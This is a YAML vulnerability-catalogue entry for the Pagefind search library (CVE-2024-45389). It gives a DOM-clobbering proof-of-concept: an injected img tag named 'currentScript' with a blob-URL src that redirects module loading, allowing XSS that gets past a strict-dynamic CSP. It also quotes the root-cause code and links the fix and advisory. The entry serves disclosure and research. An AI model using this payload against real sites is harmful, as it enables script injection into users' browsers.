---
description: Pagefind is a fully static search library that aims to perform well on large sites, while using as little of your users' bandwidth as possible, and without hosting any infrastructure.
github: CloudCannon/pagefind
gadgets:
  ≤v1.1.0:
    cve: CVE-2024-45389
    authors:
      - github:jackfromeast
      - github:ishmeals
    tags:
      - chrome-browser
      - safari-browser
      - img-tag
      - src-attr
      - name-attr
      - strict-dynamic-csp
      - before-lib-load
    pocs:
      - description: The [pagefind](https://github.com/CloudCannon/pagefind) library was loading modules using as a base the `document.currentScript.src` value on this regex `match(/^(.*\/)(?:pagefind-)?ui.js.*$/)[1]`.
        code: |
          <div id="search"></div>
          <script nonce="secret" type="module">
            import * as pagefinddefaultUi from 'https://cdn.jsdelivr.net/npm/@pagefind/default-ui@1.1.0/+esm';

            new pagefinddefaultUi.PagefindUI({ element: "#search", showSubResults: true });
            const inputElement = document.querySelector('.pagefind-ui__search-input.svelte-e9gkc3');
            if (inputElement) {
              inputElement.value = 'Your text here';
              inputElement.dispatchEvent(new Event('input'));
            }
          </script>

          <!-- user input -->
          <img name="currentScript" src="blob:[current-location]/assets/xss/ui.js">
    more-info: |
      **Root Cause**

      Source: <a target="_blank" href="https://github.com/Pagefind/pagefind/blob/8dc9eca357cee070ccc5592e268d86bc9259a883/pagefind_ui/default/ui-core.js#L5">https://github.com/Pagefind/pagefind/blob/8dc9eca357cee070ccc5592e268d86bc9259a883/pagefind_ui/default/ui-core.js#L5</a>

      ```javascript
      let scriptBundlePath;
      try {
        scriptBundlePath = new URL(document.currentScript.src).pathname.match(
          /^(.*\/)(?:pagefind-)?ui.js.*$/
        )[1];
      } catch (e) {
        scriptBundlePath = "/pagefind/";
      }
      ```

      Source: <a target="_blank" href="https://github.com/Pagefind/pagefind/blob/8dc9eca357cee070ccc5592e268d86bc9259a883/pagefind_ui/default/svelte/ui.svelte#L95">https://github.com/Pagefind/pagefind/blob/8dc9eca357cee070ccc5592e268d86bc9259a883/pagefind_ui/default/svelte/ui.svelte#L95</a>

      ```javascript
      imported_pagefind = await import(`${base_path}pagefind.js`);
      ```
    links:
      - https://github.com/Pagefind/pagefind/commit/14ec96864eabaf1d7d809d5da0186a8856261eeb
      - https://github.com/advisories/GHSA-gprj-6m2f-j9hx
      - https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/pagefind.md
      - https://jackfromeast.github.io/assets/DOMinoEffect.pdf
---
